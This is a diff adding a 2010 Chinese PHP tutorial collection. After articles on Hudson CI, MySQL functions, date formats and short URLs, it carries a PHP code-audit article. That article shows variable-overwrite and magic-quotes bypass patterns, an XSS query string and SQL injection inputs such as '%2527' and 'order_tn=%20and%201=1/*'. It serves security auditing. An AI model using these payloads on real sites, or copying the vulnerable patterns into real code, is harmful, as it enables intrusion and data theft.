@@ -1,0 +1,4518 @@
+Php中文教程集
+MoXie(moxie@zoeey.org)
+2010-07-12
+该文档各文章版权归其作者所有，如需删除请联系本手册编辑人员。
+
+任务说明
+本文档的收录过程
+推荐，由网友推荐文章。推荐格式参照下面的格式说明。
+
+审核，堕落群内部成员审核，主要检查文章质量。
+
+校对，文章勘误，更正文章作者。
+
+编辑，转换文章为通用格式并生成发布。
+
+
+
+推荐格式说明：
+
+
+<code>
+1、作者
+2、联系方式
+3、作者网站
+4、文章出处
+5、内容提要
+6、建议分类
+7、推荐人介绍
+
+</code>
+
+本章主要介绍日常Php开发所能利用到的各类工具。
+
+====== 本章摘要 ======
+本章主要介绍Php开发调试使用到的各类工具
+
+====== 利用Hudson构建Php持续集成 ======
+Hudson
+作者介绍
+作者：MoXie
+
+
+联系：system128@gmail.com
+
+
+网站：
+**http://zoeey.org**
+
+文章出处：
+**http://www.phpchina.com/bbs/thread-147599-1-1.html**
+
+发布日期：2009-8-19 16:35
+
+
+相关工具
+  ;Hudson： https://hudson.dev.java.net/ : 介绍：持续构建工具。
+
+下载： 
+**http://hudson-ci.org/latest/hudson.war**
+备注：需要Java环境,JRE的安装方式就不说了，自己搜一下。 本文使用版本 Hudson ver.             1.320
+
+  ;Phing： http://phing.info : 介绍：基于ant的项目构建系统。
+
+下载： 
+**http://phing.info/trac/wiki/Users/Download**
+备注：本文使用版本 phing-2.3.3
+
+  ;Phing Plugin： http://wiki.hudson-ci.org/display/HUDSON/Phing+Plugin : 介绍：为Hudson提供Phing支持的插件。
+
+备注：Hudson插件列表里默认列出，安装方式在下面。
+
+  ;SVN： http://subversion.tigris.org/ : 介绍：版本控制工具
+
+备注：教程较多不做详细介绍。推荐两个工具，都是傻瓜式安装的。 客户端 小乌龟： 
+**http://tortoisesvn.tigris.org/**             服务器端 VisualSVN: 
+**http://www.visualsvn.com/**
+  ;NetBeans： http://www.netbeans.org/ : 介绍：IDE，对PHPUnit有友好支持。
+
+备注：构建PHPUnit环境参考下面PHPUnit的介绍。
+
+  ;Hudson Support： http://plugins.netbeans.org/PluginPortal/faces/PluginDetailPage.jsp?pluginid=2178 : 介绍：NetBeans Hudson支持插件。
+
+备注：可以方便操作，不强制安装。
+
+  ;PHPUnit： http://www.phpunit.de/ : 介绍：PHP单元测试工具
+
+参考：
+**http://bbs.phpchina.com/viewthread.php?tid=104215**
+备注：这篇文章是NetBeans 7.0m1 刚发布时写的，现在的最新版本已经支持PHPUnit了，可以去下载             6.7.1以后的版本。
+
+
+架设流程
+1、创建可测试的工程：在NetBeans中新建项目，例如 HudsonPHP。 新建一个Class文件（可直接使用 
+**http://bbs.phpchina.com/viewthread.php?tid=104215**中的       PhpUnitSample ）。 并按 工具 -> 创建PHPUnit测试 指定目录为       {$project}/test，内容可参考上文。
+
+
+2、提供版本控制支持：新建的版本库HudsonPHP（我是用的是VisualSVN，不会的朋友去搜教程）。 将操作 1       中的项目导入这个版本库（在NetBeans项目上右键Subversion）。
+
+
+3、安装Hudson：运行Hudson可直接执行 java -jar hudson.war 也可以将其部署到Tomcat等容器内。       操作方式网上教程较多，在此不再累述，关键词： war tomcat。 运行后默认端口是 8080 ，我在本地运行所以打开       http://localhost:8080/
+
+
+4、安装Hudson的Phing Plugin。按顺序点击 左侧的 Manage Hudson >> 右侧的       Manage Plugins >> Available 找到 Hudosn Phing plugin >> 按最下面的       install 。
+
+
+
+**选中Phing Plugin**
+
+{{:Update%20Center%20%5BHudson%5D_1250665207553.png|Update%20Center%20%5BHudson%5D_1250665207553.png}}
+
+**Phing Plugin安装成功**
+
+{{:Update%20Center%20%5BHudson%5D_1250665165273.png|Update%20Center%20%5BHudson%5D_1250665165273.png}}
+\\
+安装后需要重启服务器:退到首页 >> Manage Hudson >> Prepare for       Shutdown ;如不自动重启就手动把～在cmd里执行的就是接ctrl+c，再运行。
+
+
+\\
+回到首页 左侧的 Manage Hudson >> Configure System >> Phing       installation
+
+
+\\
+我的设置：
+
+
+<code>
+name ： Phing_2.3.3
+PHING_HOME : E:\Tools\phing-2.3.3
+PHP Command : E:\Tools\wamp\bin\php\php5.2.5\php.exe        
+</code>
+
+<note warning>
+不需要使用pear方式安装phing，PHING_HOME就是你下载的Phing包直接解压后的目录，系统会识别出目录是否正确的。         PHP Command 就不多说了，就是php.exe的位置。
+
+</note>
+
+**我的Phing设置**
+
+{{:Hudson_1250667982700.png|Hudson_1250667982700.png}}
+\\
+5、新建工作：Hudson左侧点击New Job ，Job name 设置成工程目录就可以了，不做特殊要求，例如       HudsonPHP。下面要选的应该是构筑方式或类型。 我们选择第二个（Build a free-style software       project），点击 OK。
+
+
+\\
+我们来到了配置页面，下面给出的是主要配置参数范例：
+
+
+<code>
+Source Code Management： 源码管理。
+    选择 Subversion ，在 Repository URL 填写版本库url 
+    如 https://MoXie-PC:321/svn/HudsonPHP/trunk。
+    Repository browser：（auto） 这是默认的。
+Build Triggers：构建触发配置。
+    选择 Poll SCM , Schedule 填： 50 * * * * 。
+    意思是每50分钟自动执行。具体参数配置方式参考右侧问号内的帮助。
+Build：构建方式
+    点击： Add build step，选择 Invoke Phing targets。配置如下：
+       Phing Version ： 选择我们刚新增的 Phing_2.3.3
+       Targets：填写 test （就是项目测试文件目录）
+点击Sava，基本配置就这些了。        
+</code>
+
+
+**工程设置（查看大图）**
+
+{{:HudsonPHP%20Config%20%5BHudson%5D_1250673882462.png|HudsonPHP%20Config%20%5BHudson%5D_1250673882462.png}}
+\\
+6、Build脚本：在工程目录下新建文件 build.xml。内容如下：
+
+
+<code>
+<?xml version="1.0" ?>
+<project name="HudsonPHP" default="test">
+<property name="tests.dir" value="test" />
+<target name="test" description="Run PHPUnit tests">
+    <phpunit haltonerror="true" haltonfailure="true" printsummary="true">
+ <batchtest>
+     <fileset dir="${tests.dir}">
+       <include name="**/*Test.php" />
+     </fileset>
+ </batchtest>
+    </phpunit>
+</target>
+</project>
+</code>
+
+\\
+7、最终运行：左侧点击Build now，在左下就会看到进程条了。蓝色的气球就代表成功。 点入刚进行的Build #1，点击左侧       Console Output，可以看到整个执行过程。如下例：
+
+
+
+**工作输出**
+
+{{:PhpSample%20Console%20%5BHudson%5D_1250668684394.png|PhpSample%20Console%20%5BHudson%5D_1250668684394.png}}
+====== MySQL 集合交集检查函数 ======
+mysql交集函数
+<note warning>
+此样例文章，最终可能不保留。
+
+</note>
+作者介绍
+作者：MoXie
+
+
+联系：system128@gmail.com
+
+
+网站：
+**http://zoeey.org**
+
+文章出处：
+**http://www.zoeey.com/2010/07/01/mysql-intersection-of-sets/**
+
+发布日期：2010-07-01
+
+
+内容
+在文章拥有多重分类且存储在单个文本字段内，调用多个分类的数据时，我们可能需要计算两个数组的交集。
+
+
+如 文章文类为 “1,2,3,6″ ，调用的分类有 “5,6,7,9″ 交集为 “6″，则文章在调用范围内。
+
+
+函数提要:
+
+
+<code>
+# SUBSTRING_INDEX 返回指定分隔符前的字符串
+mysql> SELECT SUBSTRING_INDEX('www.mysql.com', '.', 1);
+        -> 'www'
+mysql> SELECT SUBSTRING_INDEX('www.mysql.com', '.', 2);
+        -> 'www.mysql'
+
+# SUBSTRING 从指定位置截取指定长度的字符串
+mysql> SELECT SUBSTRING('Quadratically',5);
+        -> 'ratically'
+mysql> SELECT SUBSTRING('Quadratically',5,6);
+        -> 'ratica'
+
+# FIND_IN_SET 返回指定字符在以逗号分割的数据集中的位置。
+mysql> SELECT FIND_IN_SET('a','a,b,c,d');
+        -> 1
+mysql> SELECT FIND_IN_SET('b','a,b,c,d');
+        -> 2
+mysql> SELECT FIND_IN_SET('e','a,b,c,d');
+        -> 0
+
+</code>
+
+集合交集检查函数源码：
+
+
+请尽量使用 MySQL 5.0.3 及更高的版本
+
+
+<code>
+DROP FUNCTION IF EXISTS  `INTE_ARRAY`;
+delimiter //
+-- 集合交集检查函数
+-- @param varchar(255) setA A 集合 如 "1,3,5,9"
+-- @param varchar(255) setB B 集合 如 "8,2,3,7"
+-- @return int(1) B 集合内单元在 A集合 内存在则返回 1 否则返回 0
+CREATE FUNCTION `INTE_ARRAY` (setA varchar(255),setB varchar(255)) RETURNS int(1)
+BEGIN
+    DECLARE idx INT DEFAULT 0 ; -- B 集合单元索引
+    DECLARE len INT DEFAULT 0;-- B 集合表达式长度
+    DECLARE llen INT DEFAULT 0;-- 最后检查位置
+    DECLARE clen INT DEFAULT 0;-- 当前检查位置
+    DECLARE tmpStr varchar(255);-- 临时检查数据集
+    DECLARE curt varchar(255);-- B 当前检查的单元
+    SET len = LENGTH(setB);
+    WHILE idx < len DO
+        SET idx = idx + 1;
+        SET tmpStr = SUBSTRING_INDEX(setB,",",idx);
+        SET clen = LENGTH(tmpStr);
+-- 获取当前 setB 中的单元
+        IF idx = 1 THEN SET curt = tmpStr;
+        ELSE SET curt = SUBSTRING(setB,llen+2,clen-llen-1);
+        END IF;
+-- 检查是否存在于 setA 中
+        IF FIND_IN_SET(curt,setA) > 0 THEN RETURN 1;
+        END IF;
+-- 当前检查终点与上次检查终点相同则跳出
+        IF clen <= llen THEN RETURN 0;
+        END IF;
+
+        SET llen = clen;
+    END WHILE;
+    RETURN 0;
+END;
+//
+delimiter ;
+
+select INTE_ARRAY("1,3,5,9","8,2,3,7") as is_inte_array;
+--select INTE_ARRAY("1,3,5,9","2,8,6,10") as is_inte_array;
+--select INTE_ARRAY("10,3,5,9","2,8,6,10") as is_inte_array;
+--select INTE_ARRAY("1,30,5,9","2,8,6,10") as is_inte_array;
+--select INTE_ARRAY("1,30,5,9","2,30,6,10") as is_inte_array;
+
+</code>
+
+====== Php常用时间格式 ======
+date format
+data 常用格式
+<note warning>
+此样例文章，最终可能不保留。
+
+</note>
+作者介绍
+作者：MoXie
+
+
+联系：system128@gmail.com
+
+
+网站： 
+**http://zoeey.org**
+
+文章出处： 
+**http://www.zoeey.com/2010/06/03/php-date-time-format/**
+
+发布日期：2010-06-03
+
+
+内容
+常用时间格式，经常忘记～记在这里。
+
+
+包括：MySQL , HTTP header,HTTP cookie,RSS,Atom
+
+
+  ;MySQL : <code>
+// 2010-06-03 05:32:03
+date('Y-m-d H:i:s');
+// 2010-06-03
+date('Y-m-d');
+
+</code>
+
+  ;HTTP header : <code>
+// Thu, 03 Jun 2010 05:34:12 GMT
+gmdate('D, d M Y H:i:s \G\M\T');
+
+</code>
+
+  ;HTTP cookie : <code>
+// Thu, 03-Jun-2010 05:35:25 GMT
+gmdate('D, d-M-Y H:i:s \G\M\T');
+
+</code>
+
+  ;RSS : <code>
+// Thu, 03 Jun 2010 05:36:20 UTC
+date('D, d M Y H:i:s T');
+// Thu, 03 Jun 2010 05:36:51 +0000
+date('D, d M Y H:i:s O');
+
+</code>
+
+  ;Atom : <code>
+// 2010-06-03T05:37:27+00:00
+date('c');
+// 2010-06-03T05:38:10Z
+gmdate('Y-m-d\TH:i:s\Z');
+
+</code>
+
+
+
+
+相关文章:
+
+
+**PHP Date()
+    Cheatsheat**
+
+====== 短网址生成(高进制数字转换) ======
+short url
+radix convert
+<note warning>
+此样例文章，最终可能不保留。
+
+</note>
+作者介绍
+作者：MoXie
+
+
+联系：system128@gmail.com
+
+
+网站： 
+**http://zoeey.org**
+
+文章出处： 
+**http://www.zoeey.com/2010/06/03/php-date-time-format/**
+
+发布日期：2010-06-03
+
+
+内容
+江湖上流传着各种各样的短网址“算法”但无不能逃脱高重复性和低效率的厄运。
+
+
+这里不免俗的也说一下直接由自增序列来生产短网址的方法。
+
+
+使用六十二进制将十进制数字变“短”。
+
+
+例如数据库中第 56800235583 条信息，对应的短网址后缀可以是 ZZZZZZ 。
+
+
+下面是存储示例：
+
+
+id 自增序列/自增编号
+
+
+url 目标链接
+
+
+*suffix* 短网址后缀 （并不需要存储在数据库内）
+
+
+<code>
++------------+-----------------------+---------+
+|id          | url                   | *suffix*|
++------------+-----------------------+---------+
+|123456      | http://zoeey.com/     | w7e     |
++------------+-----------------------+---------+
+|123457      | http://www.zoeey.com/ | w7f     |
++------------+-----------------------+---------+
+|56800235582 | http://zoeey.org/     | ZZZZZY  |
++------------+-----------------------+---------+
+|56800235583 | http://www.zoeey.org/ | ZZZZZZ  |
++------------+-----------------------+---------+
+
+</code>
+
+短网址使用流程：
+
+
+  - 提交网址存储后获取其编号 如：123456
+  - 用dec2Any将编号转换为62进制，并拼接网址 如：http://go.to/w7e
+  - 用户访问到 http://go.to/w7e 时，提取短网址后缀 w7e
+  - 用any2Dec将短网址后缀转换为10进制，得到链接编号 如：123456
+  - 使用编号查询链接，并进行跳转
+下面是进制转换所需要的源码：
+
+
+<code>
+/*
+ * MoXie (SysTem128@GMail.Com) 2010-6-30 17:53:57
+ *
+ * Copyright © 2008-2010 Zoeey.Org . All rights are reserved.
+ * Code license: Apache License  Version 2.0
+ * http://www.apache.org/licenses/LICENSE-2.0.txt
+ */
+error_reporting(E_ALL);
+
+/**
+ * 返回一字符串，十进制 number 以 radix 进制的表示。
+ * @param dec       需要转换的数字
+ * @param toRadix    输出进制。当不在转换范围内时，此参数会被设定为 2，以便及时发现。
+ * @return    指定输出进制的数字
+ */
+function dec2Any($dec, $toRadix) {
+    $MIN_RADIX = 2;
+    $MAX_RADIX = 62;
+    $num62 = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    if ($toRadix < $MIN_RADIX || $toRadix > $MAX_RADIX) {
+        $toRadix = 2;
+    }
+    if ($toRadix == 10) {
+        return $dec;
+    }
+    // -Long.MIN_VALUE 转换为 2 进制时长度为65
+    $buf = array();
+    $charPos = 64;
+    $isNegative = $dec < 0; //(bccomp($dec, 0) < 0);
+    if (!$isNegative) {
+        $dec = -$dec; // bcsub(0, $dec);
+    }
+
+    while (bccomp($dec, -$toRadix) <= 0) {
+        $buf[$charPos--] = $num62[-bcmod($dec, $toRadix)];
+        $dec = bcdiv($dec, $toRadix);
+    }
+    $buf[$charPos] = $num62[-$dec];
+    if ($isNegative) {
+        $buf[--$charPos] = '-';
+    }
+    $_any = '';
+    for ($i = $charPos; $i < 65; $i++) {
+        $_any .= $buf[$i];
+    }
+    return $_any;
+}
+
+/**
+ * 返回一字符串，包含 number 以 10 进制的表示。
+ * fromBase 只能在 2 和 62 之间（包括 2 和 62）。
+ * @param number    输入数字
+ * @param fromRadix    输入进制
+ * @return  十进制数字
+ */
+function any2Dec($number, $fromRadix) {
+    $num62 = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $dec = 0;
+    $digitValue = 0;
+    $len = strlen($number) - 1;
+    for ($t = 0; $t <= $len; $t++) {
+        $digitValue = strpos($num62, $number[$t]);
+        $dec = bcadd(bcmul($dec, $fromRadix), $digitValue);
+    }
+    return $dec;
+}
+
+$sol = '' . PHP_EOL;
+echo dec2Any('56800235583', 62), $sol; // ZZZZZZ
+echo any2Dec('ZZZZZZ', 62), $sol; // 56800235583
+echo dec2Any('123456', 62), $sol; // w7e
+echo any2Dec('w7e', 62), $sol; // 123456
+
+</code>
+
+
+
+参考资料：
+
+
+**Zoeey/NumberHelper.java**
+
+====== 卷首语 ======
+作者介绍
+作者：80vul
+
+
+联系：Email 5up3rh3i@gmail.com MSN SuperHei@ph4nt0m.org
+
+
+网站：
+**http://www.80vul.com/****http://code.google.com/p/pasc2at/**
+
+文章出处：
+**http://code.google.com/p/pasc2at/wiki/SimplifiedChinese**
+
+发布日期：2010-03-01
+
+
+推荐人
+Jessica
+
+内容简介
+PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。也就是这样的形势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些大家都知道的审计技术都无用武之地了。我们面对很多工具以及大牛扫描过n遍的代码，有很多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术经验和大家分享。
+
+
+另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在这里需要感谢他们 ：）
+
+
+====== 传统的代码审计技术 ======
+代码审计
+WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得MS那句经典的名言吗？“一切输入都是有害的”。这句话只强调了变量输入，很多程序员把“输入”理解为只是gpc`[`$`_`GET,$`_`POST,$`_`COOKIE`]`，但是变量在传递过程产生了n多的变化。导致很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：“一切进入函数的变量是有害的”。
+
+
+PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。
+
+
+其他的方法有：通过修改PHP源代码来分析变量流程，或者hook危险的函数来实现对应用程序代码的审核，但是这些也依靠了我们上面提到的字典。
+
+
+====== PHP版本与应用代码审计 ======
+到目前为止，PHP主要有3个版本：php4、php5、php6，使用比例大致如下：
+
+
+主要Php版本
+php4
+68%
+2000-2007，No security fixes after 2008/08，最终版本是php4.4.9
+php5
+32%
+2004-present，Now at version 5.2.6（PHP 5.3 alpha1 released!）
+php6
+N/A
+目前还在测试阶段，变化很多做了大量的修改，取消了很多安全选项如magic_quotes_gpc（这个不是今天讨论的范围）
+由于php缺少自动升级的机制，导致目前PHP版本并存，也导致很多存在漏洞没有被修补。这些有漏洞的函数也是我们进行WEB应用程序代码审计的重点对象，也是我们字典重要来源。
+
+
+====== 其他的因素与应用代码审计 ======
+很多代码审计者拿到代码就看，他们忽视了“安全是一个整体”，代码安全很多的其他因素有关系，比如上面我们谈到的PHP版本的问题，比较重要的还有操作系统类型（主要是两大阵营win/`*`nix），WEB服务端软件（主要是iis/apache两大类型）等因素。这是由于不同的系统不同的WEB     SERVER有着不同的安全特点或特性，下文有些部分会涉及。
+
+
+所以我们在做某个公司WEB应用代码审计时，应该了解他们使用的系统，WEB服务端软件，PHP版本等信息。
+
+
+====== 扩展我们的字典 ======
+下面将详细介绍一些非传统PHP应用代码审计一些漏洞类型和利用技巧。
+
+===== 变量本身的key =====
+说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。
+
+
+<code>
+<?php
+//key.php?aaaa'aaa=1&bb'b=2 
+//print_R($_GET); 
+ foreach ($_GET AS $key => $value)
+{
+ print $key."\n";
+}
+?>
+
+</code>
+
+上面的代码就提取了变量本身的key显示出来，单纯对于上面的代码，如果我们提交URL：
+
+
+<code>
+key.php?<script>alert(1);</script>=1&bbb=2
+
+</code>
+
+那么就导致一个xss的漏洞，扩展一下如果这个key提交给include()等函数或者sql查询呢？：）
+
+
+漏洞审计策略
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：通读代码
+
+===== 变量覆盖 =====
+很多的漏洞查找者都知道extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖，但是还有很多其他情况导致变量覆盖的如：
+
+==== 遍历初始化变量 ====
+请看如下代码：
+
+
+<code>
+<?php
+//var.php?a=fuck
+$a='hi';
+foreach($_GET as $key => $value) {
+ $$key = $value;
+}
+print $a;
+?>
+
+</code>
+
+很多的WEB应用都使用上面的方式（注意循环不一定是foreach），如Discuz!4.1的WAP部分的代码：
+
+
+<code>
+$chs = '';
+if($_POST && $charset != 'utf-8') {
+ $chs = new Chinese('UTF-8', $charset);
+ foreach($_POST as $key => $value) {
+  $$key = $chs->Convert($value);
+}
+unset($chs);
+
+</code>
+
+漏洞审计策略
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：通读代码
+
+==== parse_str()变量覆盖漏洞 ====
+<code>
+//var.php?var=new
+$var = 'init';                     
+parse_str($_SERVER['QUERY_STRING']); 
+print $var;
+
+</code>
+
+该函数一样可以覆盖数组变量，上面的代码是通过$`_`SERVER['QUERY_STRING']来提取变量的，对于指定了变量名的我们可以通过注射“=”来实现覆盖其他的变量：
+
+
+<code>
+//var.php?var=1&a[1]=var1%3d222
+$var1 = 'init';
+parse_str($a[$_GET['var']]);
+print $var1;
+
+</code>
+
+上面的代码通过提交$var来实现对$var1的覆盖。
+
+
+漏洞审计策略（parse_str）
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：查找字符parse_str
+
+漏洞审计策略（mb_parse_str）
+PHP版本要求：php4<4.4.7 php5<5.2.2
+
+系统要求：无
+
+审计策略：查找字符mb_parse_str
+
+==== import_request_variables()变量覆盖漏洞 ====
+<code>
+//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1
+echo 'GLOBALS '.(int)ini_get("register_globals")."n";
+import_request_variables('GPC');
+if ($_SERVER['REMOTE_ADDR'] != '10.1.1.1') die('Go away!');
+echo 'Hello admin!';
+
+</code>
+
+漏洞审计策略（import_request_variables）
+PHP版本要求：php4<4.4.1 php5<5.2.2
+
+系统要求：无
+
+审计策略：查找字符import_request_variables
+
+==== PHP5 Globals ====
+从严格意义上来说这个不可以算是PHP的漏洞，只能算是一个特性，测试代码：
+
+
+<code>
+<?
+// register_globals =ON
+//foo.php?GLOBALS[foobar]=HELLO
+php echo $foobar; 
+?>
+
+</code>
+
+但是很多的程序没有考虑到这点，请看如下代码：
+
+
+<code>
+//为了安全取消全局变量
+//var.php?GLOBALS[a]=aaaa&b=111
+if (ini_get('register_globals')) foreach($_REQUEST as $k=>$v) unset(${$k});
+print $a;
+print $_GET[b];
+
+</code>
+
+如果熟悉WEB2.0的攻击的同学，很容易想到上面的代码我们可以利用这个特性进行crsf攻击。
+
+
+漏洞审计策略
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：通读代码
+
+
+
+===== magic_quotes_gpc与代码安全 =====
+==== 什么是magic_quotes_gpc ====
+当打开时，所有的 '（单引号），"（双引号），\（反斜线）和 NULL         字符都会被自动加上一个反斜线进行转义。还有很多函数有类似的作用         如：addslashes()、mysql_escape_string()、mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全。很多漏洞查找者或者工具遇到些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。         ：）
+
+==== 哪些地方没有魔术引号的保护 ====
+  ;$`_`SERVER变量 : PHP5的$`_`SERVER变量缺少magic_quotes_gpc的保护，导致近年来X-Forwarded-For的漏洞猛暴，所以很多程序员考虑过滤X-Forwarded-For，但是其他的变量呢？
+漏洞审计策略($`_`SERVER变量)
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：查找字符`_`SERVER
+
+  ;getenv()得到的变量（使用类似$`_`SERVER变量） : 漏洞审计策略(getenv())
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：查找字符getenv
+
+  ;$HTTP_RAW_POST_DATA与PHP输入、输出流 : 主要应用与soap/xmlrpc/webpublish功能里，请看如下代码：
+<code>
+if ( !isset( $HTTP_RAW_POST_DATA ) ) {
+ $HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );
+}
+if ( isset($HTTP_RAW_POST_DATA) )
+ $HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA);
+
+</code>
+
+漏洞审计策略（数据流）
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：查找字符HTTP_RAW_POST_DATA或者php://input
+
+  ;数据库操作容易忘记'的地方如：in()/limit/order by/group by : 如Discuz!<5.0的pm.php：
+<code>
+if(is_array($msgtobuddys)) {
+ $msgto = array_merge($msgtobuddys, array($msgtoid));
+  ......
+foreach($msgto as $uid) {
+ $uids .= $comma.$uid;
+ $comma = ',';
+}
+......
+$query = $db->query("SELECT m.username, mf.ignorepm FROM {$tablepre}members m
+ LEFT JOIN {$tablepre}memberfields mf USING(uid)
+ WHERE m.uid IN ($uids)");
+
+</code>
+
+漏洞审计策略
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：查找数据库操作字符（select,update,insert等等）
+
+
+==== 变量的编码与解码 ====
+一个WEB程序很多功能的实现都需要变量的编码解码，而且就在这一转一解的传递过程中就悄悄的绕过你的过滤的安全防线。
+
+
+这个类型的主要函数有：
+
+
+  - stripslashes() 这个其实就是一个decode-addslashes()
+  - 其他字符串转换函数：
+
+
+Tabulka: **字符串转换函数**
+
+|base64_decode|对使用 MIME base64 编码的数据进行解码|
+|base64_encode|使用 MIME base64 对数据进行编码|
+|rawurldecode|对已编码的 URL 字符串进行解码|
+|rawurlencode|按照 RFC 1738 对 URL 进行编码|
+|urldecode|解码已编码的 URL 字符串|
+|urlencode|编码 URL 字符串|
+另外一个 unserialize/serialize
+
+  - 字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等
+
+目前很多漏洞挖掘者开始注意这一类型的漏洞了，如典型的urldecode：
+
+<code>
+$sql = "SELECT * FROM article WHERE articleid='".urldecode($_GET[id])."'";
+
+</code>
+
+当magic_quotes_gpc=on时，我们提交?id=%2527，得到sql语句为：
+
+<code>
+SELECT * FROM article WHERE articleid='''
+
+</code>
+
+漏洞审计策略
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：查找对应的编码函数
+
+==== 二次攻击 ====
+<note warning>
+原文有参见 http://bbs.phpchina.com/attachment.php?aid=22294           的链接，已失效。
+
+</note>
+  - 数据库出来的变量没有进行过滤
+  - 数据库的转义符号：
+mysql/oracle转义符号同样是\（我们提交'通过魔术引号变化为\'，当我们update进入数据库时，通过转义变为'）
+mssql的转义字符为'（所以我们提交'通过魔术引号变化为\'，mssql会把它当为一个字符串直接处理，所以魔术引号对于mssql的注射没有任何意义）
+从这里我们可以思考得到一个结论：一切进入函数的变量都是有害的，另外利用二次攻击我们可以实现一个webrootkit，把我们的恶意构造直接放到数据库里。我们应当把这样的代码看成一个vul？
+
+漏洞审计策略
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：通读代码
+
+==== 魔术引号带来的新的安全问题 ====
+首先我们看下魔术引号的处理机制：
+
+
+<code>
+[\-->\\,'-->\',"-->\",null-->\0]
+
+</code>
+
+这给我们引进了一个非常有用的符号“\”，“\”符号不仅仅是转义符号，在WIN系统下也是目录转跳的符号。这个特点可能导致php应用程序里产生非常有意思的漏洞：
+
+
+  - 得到原字符（',\,",null]）
+<code>
+$order_sn=substr($_GET['order_sn'], 1);
+
+//提交                 '
+//魔术引号处理         \'
+//substr               '
+
+$sql = "SELECT order_id, order_status, shipping_status, pay_status, ".
+   " shipping_time, shipping_id, invoice_no, user_id ".
+   " FROM " . $ecs->table('order_info').
+   " WHERE order_sn = '$order_sn' LIMIT 1";
+
+</code>
+
+  - 得到“\”字符
+
+<code>
+$order_sn=substr($_GET['order_sn'], 0,1);
+
+//提交                 '
+//魔术引号处理         \'
+//substr               \    
+
+$sql = "SELECT order_id, order_status, shipping_status, pay_status, ".
+   " shipping_time, shipping_id, invoice_no, user_id ".
+   " FROM " . $ecs->table('order_info').
+   " WHERE order_sn = '$order_sn' and order_tn='".$_GET['order_tn']."'";
+
+</code>
+
+提交内容：
+
+<code>
+?order_sn='&order_tn=%20and%201=1/* 
+</code>
+
+执行的SQL语句为
+
+<code>
+SELECT order_id, order_status, shipping_status, pay_status, shipping_time, 
+shipping_id, invoice_no, user_id FROM order_info WHERE order_sn = '\' and 
+order_tn=' and 1=1/*'
+
+</code>
+
+漏洞审计策略
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：查找字符串处理函数如substr或者通读代码
+
+==== 变量key与魔术引号 ====
+我们最在这一节的开头就提到了变量key，PHP的魔术引号对它有什么影响呢？
+
+
+<code>
+<?php
+//key.php?aaaa'aaa=1&bb'b=2 
+//print_R($_GET); 
+ foreach ($_GET AS $key => $value)
+        {
+        print $key."\n";
+        }
+?>
+
+</code>
+
+  - 当magic_quotes_gpc = On时，在php5.24下测试显示：
+
+<code>
+aaaa\'aaa
+bb\'b
+
+</code>
+
+从上面结果可以看出来，在设置了magic_quotes_gpc =             On下，变量key受魔术引号影响。但是在php4和php<5.2.1的版本中，不处理数组第一维变量的key，测试代码如下：
+
+<code>
+<?php
+//key.php?aaaa'aaa[bb']=1 
+print_R($_GET); 
+?>
+
+</code>
+
+结果显示:
+
+<code>
+Array ( [aaaa'aaa] => Array ( [bb\'] => 1 ) ) 
+
+</code>
+
+数组第一维变量的key不受魔术引号的影响。
+
+漏洞审计策略
+PHP版本要求：php4和php<5.2.1
+
+系统要求：无
+
+审计策略：通读代码
+
+  - 当magic_quotes_gpc = Off时，在php5.24下测试显示：
+
+<code>
+aaaa'aaa
+bb'b
+
+</code>
+
+对于magic_quotes_gpc =             Off时所有的变量都是不安全的，考虑到这个，很多程序都通过addslashes等函数来实现魔术引号对变量的过滤，示例代码如下：
+
+<code>
+<?php 
+//keyvul.php?aaa'aa=1'
+//magic_quotes_gpc = Off
+ if (!get_magic_quotes_gpc())
+{
+ $_GET  = addslashes_array($_GET);
+}
+
+function addslashes_array($value)
+{
+        return is_array($value) ? array_map('addslashes_array', $value) : addslashes($value);
+}
+print_R($_GET);
